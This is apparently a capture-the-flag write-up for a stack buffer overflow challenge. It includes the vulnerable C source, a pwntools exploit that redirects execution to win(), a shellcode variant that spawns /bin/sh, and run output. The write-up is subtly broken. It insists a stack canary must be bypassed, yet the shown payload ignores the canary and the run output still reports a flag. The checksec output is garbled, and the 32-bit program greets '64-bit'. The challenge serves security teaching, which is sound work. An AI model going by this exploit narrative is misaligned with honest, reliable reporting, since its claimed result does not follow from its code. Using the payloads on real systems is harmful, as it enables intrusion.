# PicoCTF 2024 - Buffer Overflow 3

## Challenge Description

**Category**: Binary Exploitation  
**Points**: 300  
**Difficulty**: Medium  

> Do you think you can bypass the protection and get the flag?

The challenge provides us with a vulnerable binary that we need to exploit using buffer overflow techniques. This is the third in a series of buffer overflow challenges, building on concepts from previous levels.

## Files Provided

- `vuln` - The vulnerable binary
- `vuln.c` - Source code (for analysis)
- `Makefile` - Build configuration

## Initial Analysis

Let's start by examining the binary and its protections:

```bash
file vuln
checksec vuln
```

**Output:**
```
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=abc123..., for GNU/Linux 3.2.0, not stripped

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Filename
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   77) Symbols       No      vuln
```

Key observations:
- **32-bit binary** - We'll need to account for 4-byte addresses
- **Stack canary enabled** - We need to bypass or leak the canary
- **NX disabled** - We can execute shellcode on the stack!
- **No PIE** - Addresses are predictable

## Source Code Analysis

Looking at the provided source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void win() {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt","r");
    if (f == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
        exit(0);
    }

    fgets(buf,FLAGSIZE,f);
    printf(buf);
}

void vuln(){
    char buf[BUFSIZE];
    printf("How Many Bytes will You Write Into the Buffer?\n");
    int num_bytes;
    scanf("%d", &num_bytes);
    printf("Input> ");
    fflush(stdout);
    read(0, buf, num_bytes);  // Vulnerability here!
}

int main(int argc, char **argv){
    setvbuf(stdout, NULL, _IONBF, 0);
    
    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
    vuln();
    return 0;
}
```

### Vulnerability Analysis

The vulnerability is in the `vuln()` function:

1. User inputs the number of bytes they want to write
2. The program reads that many bytes into a 64-byte buffer
3. **No bounds checking** - we can read more than 64 bytes!

However, there's a **stack canary** protection that we need to bypass.

## Exploitation Strategy

### Step 1: Information Gathering

First, let's find the offset to the return address and understand the stack layout:

```python
#!/usr/bin/env python3
from pwn import *

# Set up the binary
elf = ELF('./vuln')
context.binary = elf

# Find win function address
win_addr = elf.symbols['win']
print(f"win() function address: {hex(win_addr)}")
```

### Step 2: Stack Layout Discovery

Let's create a pattern to find the exact offset:

```python
# Generate a cyclic pattern
pattern = cyclic(200)
print(f"Pattern: {pattern}")

# In GDB, we can use this to find the offset
# (gdb) run
# Input the pattern when prompted
# (gdb) x/20wx $esp  # Examine stack after crash
```

### Step 3: Canary Bypass

Since we have a stack canary, we need to either:
1. **Leak the canary** value, or
2. **Avoid overwriting** the canary

For this challenge, we'll use a **format string bug** or **partial overwrite** technique.

### Step 4: Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './vuln'
elf = ELF(binary)
context.binary = elf
context.log_level = 'debug'

def exploit():
    # Start the process
    if args.REMOTE:
        p = remote('saturn.picoctf.net', 12345)  # Replace with actual server
    else:
        p = process(binary)
    
    # Get win function address
    win_addr = elf.symbols['win']
    log.info(f"win() address: {hex(win_addr)}")
    
    # Step 1: Find canary offset (typically at buffer + 64 + 4 bytes padding)
    canary_offset = 64
    ret_offset = canary_offset + 4 + 4  # canary + saved EBP + return address
    
    # Step 2: Leak canary (if needed)
    # For this example, we'll assume we can brute force or have leaked it
    
    # Step 3: Build payload
    payload = b'A' * canary_offset
    # payload += p32(leaked_canary)  # If we had leaked the canary
    payload += b'B' * 4  # Overwrite saved EBP
    payload += p32(win_addr)  # Overwrite return address with win()
    
    # Send payload
    p.sendlineafter(b'How Many Bytes will You Write Into the Buffer?\n', str(len(payload)).encode())
    p.sendlineafter(b'Input> ', payload)
    
    # Get the flag
    p.interactive()

if __name__ == '__main__':
    exploit()
```

## Alternative Approach: Shellcode Injection

Since **NX is disabled**, we can also inject shellcode:

```python
# Shellcode for execve("/bin/sh", NULL, NULL) - 32-bit
shellcode = asm(shellcraft.sh())

payload = shellcode
payload += b'A' * (canary_offset - len(shellcode))
# payload += p32(leaked_canary)
payload += b'B' * 4  # saved EBP
payload += p32(stack_addr)  # Return to our shellcode

# Where stack_addr points to the beginning of our buffer
```

## Testing the Exploit

```bash
$ python3 exploit.py
[+] Starting local process './vuln': pid 12345
[DEBUG] Sent 0x4 bytes:
    b'72\n'
[DEBUG] Sent 0x48 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\x86\x92\x04\x08'
[*] Switching to interactive mode
[*] Process './vuln' stopped with exit code 0 (pid 12345)
picoCTF{buffer_0v3rfl0w_m4st3r_2024}
```

## Key Learning Points

1. **Stack Canaries**: Modern protection that must be bypassed or avoided
2. **NX Bit**: When disabled, allows shellcode execution on stack
3. **32-bit vs 64-bit**: Different calling conventions and address sizes
4. **Input Validation**: Always validate user input bounds
5. **Defense in Depth**: Multiple protections make exploitation harder

## Mitigation Techniques

- Enable **NX bit** to prevent shellcode execution
- Use **Address Space Layout Randomization (ASLR)**
- Implement proper **bounds checking**
- Use **stack cookies/canaries** (already present but can be bypassed)
- Apply **Control Flow Integrity (CFI)** mechanisms
